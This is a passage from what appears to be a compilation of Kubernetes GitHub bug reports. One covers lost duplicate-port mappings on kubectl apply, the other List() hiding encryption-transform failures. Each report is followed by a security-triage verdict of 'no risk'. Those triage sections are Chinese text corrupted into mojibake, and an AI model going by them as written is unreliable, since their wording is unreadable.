When updating a Deployment and adding two port mappings with the same port number, but with a different protocol, only one of the mappings is created. `kubectl diff` does not detect a difference between the manifest and what's deployed. However, when applying the manifest with both port mappings from scratch, they are correctly defined. 

#### Example 

`deployment_without_ports.yaml`
<details>

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: ed-example-chart
  namespace: "playground"
  labels:
    helm.sh/chart: example-chart-0.5.1
    app.kubernetes.io/name: example-chart
    app.kubernetes.io/instance: ed
    app.kubernetes.io/version: "0.2.3"
    app.kubernetes.io/managed-by: Helm
spec:
  #<...>
    spec:
      containers:
        - name: http-echo
          image: #<...>
          imagePullPolicy: IfNotPresent
          args:
            - -text="hello I'm httpEcho"
          ports:
            - containerPort: 80
              name: http
              protocol: TCP
    #<...>
``` 
</details>

`deployment_with_ports.yaml`
<details>

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: ed-example-chart
  namespace: "playground"
  labels:
    helm.sh/chart: example-chart-0.5.1
    app.kubernetes.io/name: example-chart
    app.kubernetes.io/instance: ed
    app.kubernetes.io/version: "0.2.3"
    app.kubernetes.io/managed-by: Helm
spec:
  #<...>
    spec:
      containers:
        - name: http-echo
          image: #<...>
          imagePullPolicy: IfNotPresent
          args:
            - -text="hello I'm httpEcho"
          ports:
       	- containerPort: 53
              name: dns-tcp
              protocol: TCP
            - containerPort: 53
              name: dns-udp
              protocol: UDP
            - containerPort: 80
              name: http
              protocol: TCP
    #<...>
``` 
</details>

`kubectl apply -f deployment_with_ports.yaml` will give the expected result if the ressource doesn't already exist. 
However 
`kubectl apply -f deployment_without_ports.yaml` followed by `kubectl apply -f deployment_with_ports.yaml` will give the following result. 

<details>

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: ed-example-chart
  namespace: "playground"
  labels:
    helm.sh/chart: example-chart-0.5.1
    app.kubernetes.io/name: example-chart
    app.kubernetes.io/instance: ed
    app.kubernetes.io/version: "0.2.3"
    app.kubernetes.io/managed-by: Helm
spec:
  #<...>
    spec:
      containers:
        - name: http-echo
          image: #<...>
          imagePullPolicy: IfNotPresent
          args:
            - -text="hello I'm httpEcho"
          ports:
            - containerPort: 53
              name: dns-tcp
              protocol: TCP
			# Missing port mapping here
            - containerPort: 80
              name: http
              protocol: TCP
    #<...>
``` 
</details>

#### What did you expect to happen?

I would expect the update to the manifest to be configured with both container port mappings, like it is when creating the initial deployment. 

#### How can we reproduce it (as minimally and precisely as possible)?

- First, create a Deployment manifest with the following container port mappings 
```yaml
ports:
  - containerPort: 80
    name: http
    protocol: TCP
```
- Then create another one, identical with the following container port mappings 
```yaml
ports:
  - containerPort: 53
    name: dns-tcp
    protocol: TCP
  - containerPort: 53
    name: dns-udp
    protocol: UDP
  - containerPort: 80
    name: http
    protocol: TCP
```
- Apply first manifest, then second
- `kubectl get deploy <deploy-name> -o yaml`
- The result will be missing one of the `53` port mappings
- Delete the `Deployment`
- Apply second manifest
- It will contain all expected port mappings

#### Anything else we need to know?

_No response_

#### Kubernetes version

Tested with two Kubernetes versions
<details>

```console
$ kubectl version
Client Version: version.Info{Major:"1", Minor:"21", GitVersion:"v1.21.14", GitCommit:"0f77da5bd4809927e15d1658fb4aa8f13ad890a5", GitTreeState:"clean", BuildDate:"2022-06-15T14:17:29Z", GoVersion:"go1.16.15", Compiler:"gc", Platform:"darwin/arm64"}
Server Version: version.Info{Major:"1", Minor:"21", GitVersion:"v1.21.12", GitCommit:"696a9fdd2a58340e61e0d815c5769d266fca0802", GitTreeState:"clean", BuildDate:"2022-04-13T19:01:10Z", GoVersion:"go1.16.15", Compiler:"gc", Platform:"linux/amd64"}
```

</details>
<details>

```console
$ kubectl version
Client Version: v1.29.9
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.29.1
```

</details>


#### Cloud provider

<details>
For 1.21, cluster is onprem
For 1.29, cluster is on Oracle Kubernetes Engine
</details>


#### OS version

<details>

```console
$ sw_vers
ProductName:		macOS
ProductVersion:		14.6.1
BuildVersion:		23G93
$ uname -a
Darwin ccoupaljette-MBP 23.6.0 Darwin Kernel Version 23.6.0: Mon Jul 29 21:14:30 PDT 2024; root:xnu-10063.141.2~1/RELEASE_ARM64_T6000 arm64
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨å¯¹Kubernetes Deploymentè¿›è¡Œæ›´æ–°æ—¶ï¼Œå¦‚æœæ·»åŠ äº†å…·æœ‰ç›¸åŒç«¯å£å·ä½†ä¸åŒåè®®çš„å¤šä¸ªç«¯å£æ˜ å°„ï¼Œåªæœ‰ä¸€ä¸ªæ˜ å°„è¢«åˆ›å»ºã€‚`kubectl diff`æœªæ£€æµ‹åˆ°æ¸…å•å’Œå·²éƒ¨ç½²èµ„æºä¹‹é—´çš„å·®å¼‚ã€‚è¿™å¯¼è‡´é¢„æœŸçš„ç«¯å£æ˜ å°„æœªæ­£ç¡®æ›´æ–°ã€‚è¿™æ˜¯ä¸€ä¸ªåŠŸèƒ½æ€§é”™è¯¯ï¼Œä½†å¹¶ä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚æ ¹æ®æä¾›çš„é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œæ­¤é—®é¢˜ä¸å±äºå®‰å…¨é£é™©ã€‚

---

## Issue #127772 Listing doesn't fail if a resource of the returned set permafails to transform

- Issue é“¾æ¥ï¼š[#127772](https://github.com/kubernetes/kubernetes/issues/127772)

### Issue å†…å®¹

#### What happened?

If data transformation suddenly starts failing on a resource from a set that is returned by a List() query, the user is not notified of these failures, but is presented with the latest known version of the resource. That happens even after new, properly readable resources get added and appear in the returned set.

Get() fails correctly on the failing resource.

#### What did you expect to happen?

I expected `List()` to notify me about issues reading a resource.

#### How can we reproduce it (as minimally and precisely as possible)?

1. run the API server with etcd encryption turned on
2. rewrite your EncryptionConfiguration by replacing the key in the encryption provider
3. wait for the changes to take effect - `Get()` a resource that was previously encrypted until the `Get()` fails with an internal error
4. issue a `List()` request that contains the resource that was previously failing on `Get()`

Alternatively, you can apply the patch from the attachment that adds an integration test and 
[0001-list-broken-proof.txt](https://github.com/user-attachments/files/17202520/0001-list-broken-proof.txt)

```
make test-integration WHAT=./test/integration/controlplane/transformation GOFLAGS="-v" KUBE_TEST_ARGS='-run ^TestBrokenTransformations$'
```

#### Anything else we need to know?

I wonder if it would be possible to allow `.patch` attachments so that patches don't have to be sent as .txt files.

#### Kubernetes version

master


#### Cloud provider

irrelevant


#### OS version

_No response_

#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨ä½¿ç”¨`List()`å‡½æ•°è·å–èµ„æºåˆ—è¡¨æ—¶ï¼Œå¦‚æœæŸä¸ªèµ„æºåœ¨æ•°æ®è½¬æ¢è¿‡ç¨‹ä¸­å¤±è´¥ï¼Œ`List()`å‡½æ•°å¹¶ä¸ä¼šé€šçŸ¥ç”¨æˆ·è¿™äº›å¤±è´¥ï¼Œè€Œæ˜¯å‘ˆç°è¯¥èµ„æºçš„æœ€æ–°å·²çŸ¥ç‰ˆæœ¬ã€‚`Get()`å‡½æ•°åœ¨è·å–è¯¥å¤±è´¥çš„èµ„æºæ—¶ï¼Œèƒ½å¤Ÿæ­£ç¡®åœ°è¿”å›é”™è¯¯ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š

1. è¯¥é—®é¢˜ä¸ä¼šè¢«æ”»å‡»è€…åˆ©ç”¨ï¼Œä¸å­˜åœ¨æ”»å‡»è€…å¯ä»¥åˆ©ç”¨çš„æ¼æ´ã€‚
2. ä¸ä¼šå¯¼è‡´æƒé™æå‡ã€å‘½ä»¤æ‰§è¡Œã€ä¿¡æ¯æ³„éœ²ç­‰é«˜é£é™©å®‰å…¨é—®é¢˜ï¼Œä¹Ÿä¸ç¬¦åˆåˆ†é…CVEç¼–å·å¹¶è¾¾åˆ°CVSS 3.1è¯„åˆ†æ ‡å‡†ä¸ºHighä»¥ä¸Šçš„æ¡ä»¶ã€‚
3. è¯¥é—®é¢˜ä¸»è¦æ¶‰åŠåˆ°ç”¨æˆ·å¯¹é”™è¯¯ä¿¡æ¯çš„æ„ŸçŸ¥ï¼Œä¸å±äºå®‰å…¨é£é™©ã€‚

å› æ­¤ï¼Œé£é™©è¯„çº§åˆ¤æ–­ä¸ºä¸æ¶‰åŠã€‚

---

